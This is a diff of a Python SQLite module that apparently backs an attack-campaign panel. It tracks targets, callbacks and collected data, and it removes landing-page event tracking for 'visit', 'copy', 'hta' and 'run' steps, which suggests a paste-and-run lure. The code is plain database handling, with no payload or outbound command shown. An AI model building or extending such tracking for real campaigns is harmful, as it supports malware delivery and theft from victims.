@@ -3,6 +3,8 @@ import uuid
 import os
 from datetime import datetime, timezone, timedelta
 
+from .extensions import get_extension
+
 CST = timezone(timedelta(hours=8))  # China Standard Time
 
 
@@ -56,21 +58,9 @@ def init_db():
             FOREIGN KEY (target_id) REFERENCES targets(id)
         );
 
-        CREATE TABLE IF NOT EXISTS landing_events (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            target_id INTEGER NOT NULL,
-            event TEXT NOT NULL,
-            ip_address TEXT DEFAULT '',
-            user_agent TEXT DEFAULT '',
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE
-        );
-
         CREATE INDEX IF NOT EXISTS idx_targets_created ON targets(created_at DESC, id DESC);
         CREATE INDEX IF NOT EXISTS idx_collections_target ON collections(target_id);
         CREATE INDEX IF NOT EXISTS idx_collections_received ON collections(received_at DESC, id DESC);
-        CREATE INDEX IF NOT EXISTS idx_landing_target ON landing_events(target_id);
-        CREATE INDEX IF NOT EXISTS idx_landing_created ON landing_events(created_at DESC, id DESC);
     ''')
     conn.commit()
     # Add columns for existing databases
@@ -82,6 +72,9 @@ def init_db():
         conn.execute('ALTER TABLE targets ADD COLUMN exe_filename TEXT DEFAULT ""')
     except sqlite3.OperationalError:
         pass  # column already exists
+    ext = get_extension()
+    if ext:
+        ext.init_db(conn)
     conn.commit()
     conn.close()
 
@@ -124,9 +117,7 @@ def get_all_targets():
     conn = get_db()
     rows = conn.execute('''
         SELECT t.*,
-               (SELECT COUNT(*) FROM collections c WHERE c.target_id = t.id) as callback_count,
-               (SELECT COUNT(*) FROM landing_events le
-                WHERE le.target_id = t.id AND le.event = 'visit') as landing_visits
+               (SELECT COUNT(*) FROM collections c WHERE c.target_id = t.id) as callback_count
         FROM targets t
         ORDER BY t.created_at DESC
     ''').fetchall()
@@ -154,9 +145,7 @@ def get_targets_page(page=1, page_size=20):
     conn = get_db()
     rows = conn.execute('''
         SELECT t.*,
-               (SELECT COUNT(*) FROM collections c WHERE c.target_id = t.id) as callback_count,
-               (SELECT COUNT(*) FROM landing_events le
-                WHERE le.target_id = t.id AND le.event = 'visit') as landing_visits
+               (SELECT COUNT(*) FROM collections c WHERE c.target_id = t.id) as callback_count
         FROM targets t
         ORDER BY t.created_at DESC, t.id DESC
         LIMIT ? OFFSET ?
@@ -306,49 +295,3 @@ def get_stats():
         'total_collected': total_collected,
         'total_exes': total_exes,
     }
-
-
-LANDING_EVENTS = ('visit', 'copy', 'hta', 'run')
-
-
-def add_landing_event(target_id, event, ip_address='', user_agent=''):
-    if event not in LANDING_EVENTS:
-        return
-    conn = get_db()
-    conn.execute(
-        'INSERT INTO landing_events (target_id, event, ip_address, user_agent) '
-        'VALUES (?, ?, ?, ?)',
-        (target_id, event, (ip_address or '')[:64], (user_agent or '')[:300])
-    )
-    conn.commit()
-    conn.close()
-
-
-def get_landing_stats(target_id):
-    conn = get_db()
-    rows = conn.execute(
-        'SELECT event, COUNT(*) AS count FROM landing_events '
-        'WHERE target_id = ? GROUP BY event',
-        (target_id,)
-    ).fetchall()
-    conn.close()
-    stats = {event: 0 for event in LANDING_EVENTS}
-    for row in rows:
-        stats[row['event']] = row['count']
-    return stats
-
-
-def get_recent_landing_events(target_id, limit=10):
-    conn = get_db()
-    rows = conn.execute(
-        'SELECT * FROM landing_events WHERE target_id = ? '
-        'ORDER BY id DESC LIMIT ?',
-        (target_id, limit)
-    ).fetchall()
-    conn.close()
-    result = []
-    for row in rows:
-        d = dict(row)
-        d['created_at'] = _to_local(d.get('created_at'))
-        result.append(d)
-    return result
